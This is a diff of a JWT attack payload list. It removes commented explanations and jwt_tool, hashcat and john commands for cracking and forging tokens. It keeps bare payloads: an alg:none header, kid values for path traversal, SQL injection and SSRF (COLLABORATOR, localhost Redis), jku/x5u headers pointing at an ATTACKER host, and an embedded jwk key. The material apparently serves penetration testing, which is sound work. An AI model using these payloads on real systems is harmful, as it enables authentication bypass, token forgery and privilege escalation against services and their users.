@@ -1,58 +1,18 @@
-# ============================================================
-# JWT Payloads — Weak Secrets & Attack Techniques
-# ============================================================
- 
-# ---- ATTACK 1: alg:none ----
-# Remove signature, change alg to none
-# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.PAYLOAD.SIGNATURE
-# Modified header (base64url of {"alg":"none","typ":"JWT"}):
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
- 
-# Variants of "none" to try:
-# {"alg":"none"}
-# {"alg":"None"}
-# {"alg":"NONE"}
-# {"alg":"nOnE"}
-# {"alg":""}
-# {"alg":null}
-# {"alg":false}
- 
-# Craft:
-# Header: base64url({"alg":"none","typ":"JWT"})
-# Payload: base64url({"sub":"1","role":"admin","iat":9999999999})
-# Signature: (empty — trailing dot only)
-# Result: eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
- 
-# ---- ATTACK 2: RS256 → HS256 confusion ----
-# If server uses RS256 asymmetric:
-# Take the PUBLIC key, use it as HS256 HMAC secret
-# python3 jwt_tool.py TOKEN -X k -pk public.pem
-# hashcat -m 16500 TOKEN public_key.txt
- 
-# ---- ATTACK 3: kid Header Injection ----
-# If JWT has "kid" (key ID) header, try path traversal / SQLi / SSRF
- 
-# Path traversal → use /dev/null as key (empty secret):
+
 {"kid": "../../dev/null", "alg": "HS256"}
 {"kid": "../../../dev/null", "alg": "HS256"}
 {"kid": "/dev/null", "alg": "HS256"}
- 
-# SQLi in kid (key from DB):
+
 {"kid": "x' UNION SELECT 'attacker_secret'--", "alg": "HS256"}
 {"kid": "' OR '1'='1", "alg": "HS256"}
- 
-# SSRF in kid (fetch key from URL):
+
 {"kid": "http://COLLABORATOR/key", "alg": "HS256"}
 {"kid": "http://localhost:6379/key", "alg": "HS256"}
- 
-# ---- ATTACK 4: jku/x5u Header Injection (remote key URL) ----
-# Point to attacker's JWKS endpoint:
+
 {"alg":"RS256","jku":"https://ATTACKER/jwks.json"}
 {"alg":"RS256","x5u":"https://ATTACKER/cert.pem"}
-# Generate your own RSA keypair, host JWKS, sign token with private key
- 
-# ---- ATTACK 5: jwk Header Embed (embed attacker's key) ----
-# Embed your own public key in the JWT header:
+
 {
   "alg": "RS256",
   "jwk": {
@@ -61,32 +21,3 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
     "e": "AQAB"
   }
 }
- 
-# ---- ATTACK 6: Expired Token Reuse ----
-# If server doesn't check exp claim:
-# Modify exp to far future, re-sign with known/weak secret
- 
-# ---- ATTACK 7: Claim Modification ----
-# If weak secret found, modify payload:
-# {"sub":"1","role":"admin"} → sign with cracked secret
-# {"sub":"2","isAdmin":true}
-# {"sub":"admin"}
-# {"exp":9999999999}
-
-# ---- Tool Commands ----
-# Crack:
-# hashcat -m 16500 <token> jwt/secrets.txt --force
-# john --wordlist=jwt/secrets.txt --format=HMAC-SHA256 token.txt
-# python3 jwt_tool.py <token> -C -d jwt/secrets.txt
- 
-# Forge (after cracking):
-# python3 jwt_tool.py <token> -T -S hs256 -p "cracked_secret"
- 
-# alg:none:
-# python3 jwt_tool.py <token> -X a
- 
-# RS256→HS256:
-# python3 jwt_tool.py <token> -X k -pk public.pem
- 
-# jku injection:
-# python3 jwt_tool.py <token> -X s -ju "https://ATTACKER/jwks.json"
